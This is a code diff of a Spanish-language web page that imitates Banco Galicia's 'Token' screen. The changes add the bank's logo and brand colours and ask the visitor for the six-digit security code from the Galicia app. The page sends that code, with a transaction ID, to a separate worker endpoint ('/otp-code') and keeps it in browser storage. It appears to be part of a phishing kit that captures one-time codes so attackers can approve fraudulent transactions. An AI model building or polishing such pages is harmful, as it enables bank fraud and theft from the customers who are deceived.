@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
     <meta name="theme-color" content="#ffffff">
-    <title>Token de verificación</title>
+    <title>Token - Galicia</title>
     <style>
         * {
             margin: 0;
@@ -14,7 +14,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: #f0f0f0;
+            background: #f5f5f5;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -23,56 +23,52 @@
         }
 
         .container {
-            max-width: 420px;
+            max-width: 400px;
             width: 100%;
             background: white;
             border-radius: 12px;
-            padding: 32px 28px 40px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            padding: 30px 24px 35px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.06);
             text-align: center;
         }
 
-        .logo-container {
-            margin-bottom: 20px;
+        /* Logo */
+        .logo {
+            width: 120px;
+            height: auto;
+            margin: 0 auto 18px;
+            display: block;
         }
 
-        .logo-placeholder {
-            width: 140px;
-            height: 50px;
-            margin: 0 auto;
-            background: #ff6a00;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 24px;
-            font-weight: 700;
-            letter-spacing: 1px;
+        .logo svg {
+            width: 100%;
+            height: auto;
         }
 
+        /* Título */
         h1 {
             color: #555;
             font-size: 20px;
             font-weight: 600;
-            margin-bottom: 10px;
+            margin-bottom: 6px;
         }
 
         .subtitle {
             color: #777;
             font-size: 12px;
-            line-height: 1.8;
-            margin-bottom: 20px;
+            line-height: 1.6;
+            margin-bottom: 18px;
         }
 
+        /* Input del token */
         .input-wrapper {
-            margin: 20px 0 16px;
+            margin: 16px 0 14px;
         }
 
         .token-input {
             width: 100%;
             max-width: 260px;
-            padding: 14px 16px;
+            padding: 13px 16px;
             font-size: 20px;
             font-weight: 500;
             text-align: center;
@@ -86,7 +82,7 @@
         }
 
         .token-input:focus {
-            border-color: #ff6a00;
+            border-color: #f47721;
             background: white;
         }
 
@@ -108,13 +104,14 @@
             display: block;
         }
 
+        /* Caja de ayuda */
         .help-box {
             text-align: left;
             background: #f8f9fa;
             border-radius: 8px;
             padding: 14px 18px;
-            margin: 18px 0 22px;
-            border-left: 3px solid #ff6a00;
+            margin: 16px 0 22px;
+            border-left: 3px solid #f47721;
         }
 
         .help-title {
@@ -134,10 +131,11 @@
             color: #333;
         }
 
+        /* Botón CONFIRMAR */
         .btn-confirm {
             width: 100%;
             max-width: 260px;
-            padding: 14px;
+            padding: 13px;
             background: #ccc;
             color: white;
             border: none;
@@ -151,13 +149,13 @@
         }
 
         .btn-confirm.active {
-            background: #ff6a00;
+            background: #f47721;
         }
 
         .btn-confirm.active:hover {
-            background: #e85e00;
+            background: #e06a15;
             transform: translateY(-1px);
-            box-shadow: 0 4px 15px rgba(255, 106, 0, 0.3);
+            box-shadow: 0 4px 15px rgba(244, 119, 33, 0.3);
         }
 
         .btn-confirm.active:active {
@@ -191,7 +189,7 @@
             width: 44px;
             height: 44px;
             border: 4px solid #f0f0f0;
-            border-top: 4px solid #ff6a00;
+            border-top: 4px solid #f47721;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
             margin: 0 auto 14px;
@@ -258,7 +256,7 @@
         }
 
         .alert-btn {
-            background: #ff6a00;
+            background: #f47721;
             color: white;
             border: none;
             padding: 10px 36px;
@@ -270,7 +268,7 @@
         }
 
         .alert-btn:hover {
-            background: #e85e00;
+            background: #e06a15;
         }
 
         @keyframes shake {
@@ -284,13 +282,11 @@
                 padding: 12px;
             }
             .container {
-                padding: 24px 16px 32px;
+                padding: 24px 16px 30px;
                 border-radius: 10px;
             }
-            .logo-placeholder {
-                width: 110px;
-                height: 42px;
-                font-size: 20px;
+            .logo {
+                width: 100px;
             }
             h1 {
                 font-size: 18px;
@@ -313,20 +309,38 @@
                 margin: 0 16px;
             }
         }
+
+        @media (max-width: 380px) {
+            .token-input {
+                font-size: 16px;
+                padding: 10px 12px;
+                max-width: 190px;
+                letter-spacing: 6px;
+            }
+            .btn-confirm {
+                padding: 10px;
+                font-size: 13px;
+                max-width: 190px;
+            }
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Logo -->
-        <div class="logo-container">
-            <div class="logo-placeholder">Galicia</div>
+        <!-- Logo Galicia -->
+        <div class="logo">
+            <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="0" y="0" width="200" height="60" rx="4" fill="#f47721"/>
+                <text x="20" y="40" font-family="Arial, sans-serif" font-size="28" font-weight="700" fill="white">Galicia</text>
+                <text x="100" y="38" font-family="Arial, sans-serif" font-size="14" font-weight="300" fill="rgba(255,255,255,0.8)">Token</text>
+            </svg>
         </div>
 
         <h1>Ingresa el código Token</h1>
         <p class="subtitle">
             Genera el código Token de 6 dígitos en la App Galicia.<br>
-            Luego ingrésalo en esta pantalla.
+            Luego Ingresalo en esta pantalla.
         </p>
 
         <div class="input-wrapper">
@@ -346,7 +360,7 @@
             <div class="help-title">📱 ¿Cómo obtener el código Token?</div>
             <div class="help-text">
                 <strong>1.</strong> Ingresá a la App Galicia<br>
-                <strong>2.</strong> Presioná el botón <strong>"Token"</strong> en la pantalla de ingreso
+                <strong>2.</strong> Presioná el botón <strong>"Token Galicia"</strong> en la pantalla de ingreso
             </div>
         </div>
 
@@ -432,22 +446,19 @@
             loadingOverlay.style.display = 'flex';
 
             try {
-                // Obtener datos del localStorage
                 let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                 const transactionId = bancoldata.transactionId;
 
                 if (!transactionId) {
-                    console.error('❌ No hay transactionId en localStorage');
-                    alert('Error: Sesión no encontrada. Por favor, inicia sesión nuevamente.');
+                    console.error('❌ No hay transactionId');
+                    alert('Error: Sesión no encontrada');
                     window.location.href = `${BASE_URL}/w.html`;
                     return;
                 }
 
-                console.log('📤 Enviando código OTP:', token);
+                console.log('📤 Enviando OTP:', token);
                 console.log('🆔 TransactionId:', transactionId);
-                console.log(`📡 Worker URL: ${WORKER_URL}/otp-code`);
 
-                // Enviar al endpoint /otp-code del worker
                 const response = await fetch(`${WORKER_URL}/otp-code`, {
                     method: 'POST',
                     headers: { 
@@ -460,44 +471,30 @@
                     })
                 });
 
-                console.log('📊 Status de la respuesta:', response.status);
-
-                // Intentar parsear la respuesta como JSON
-                let result;
-                try {
-                    result = await response.json();
-                    console.log('📦 Respuesta del worker:', result);
-                } catch (parseError) {
-                    console.error('❌ Error al parsear JSON:', parseError);
-                    const textResponse = await response.text();
-                    console.log('📄 Respuesta en texto:', textResponse);
-                    throw new Error('Error al procesar la respuesta del servidor');
-                }
+                const result = await response.json();
+                console.log('📦 Respuesta:', result);
 
                 loadingOverlay.style.display = 'none';
 
                 if (result.ok) {
-                    // ✅ CÓDIGO VÁLIDO - REDIRIGIR A validacion.html para que espere el estado otp_recibido
-                    console.log('✅ Código válido, redirigiendo a validacion.html');
-                    // Guardar que el OTP fue enviado
+                    // ✅ Código válido - Guardar y redirigir a validacion.html
                     bancoldata.otp_enviado = true;
                     bancoldata.otp = token;
                     localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
                     
-                    // Redirigir a validacion.html para que espere el estado otp_recibido
+                    console.log('✅ OTP válido, redirigiendo a validacion.html');
                     window.location.href = `${BASE_URL}/validacion.html`;
                 } else {
-                    // ❌ CÓDIGO INVÁLIDO
-                    console.log('❌ Código inválido - Respuesta:', result);
+                    console.log('❌ OTP inválido');
                     mostrarErrorCajas();
                     mostrarAlerta();
                 }
 
             } catch (err) {
-                console.error('❌ Error detallado:', err);
+                console.error('❌ Error:', err);
                 loadingOverlay.style.display = 'none';
                 mostrarErrorCajas();
-                alert('Error al conectar con el servidor. Por favor, intentá nuevamente.\n\nDetalle: ' + err.message);
+                alert('Error al conectar con el servidor. Intentá nuevamente.');
             }
         }
 
@@ -542,17 +539,15 @@
         });
 
         // ==================== INICIALIZAR ====================
-        // Verificar que exista transactionId
         let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
         if (!bancoldata.transactionId) {
-            console.error('❌ No hay transactionId, redirigiendo a w.html');
+            console.error('❌ No hay transactionId');
             window.location.href = `${BASE_URL}/w.html`;
             return;
         }
 
         console.log('🔍 TransactionId:', bancoldata.transactionId);
-        console.log('🚀 Sistema de validación listo');
-        console.log(`📡 Worker URL: ${WORKER_URL}`);
+        console.log('🚀 Página de código Galicia lista');
         
         updateButton();
         setTimeout(() => input.focus(), 300);
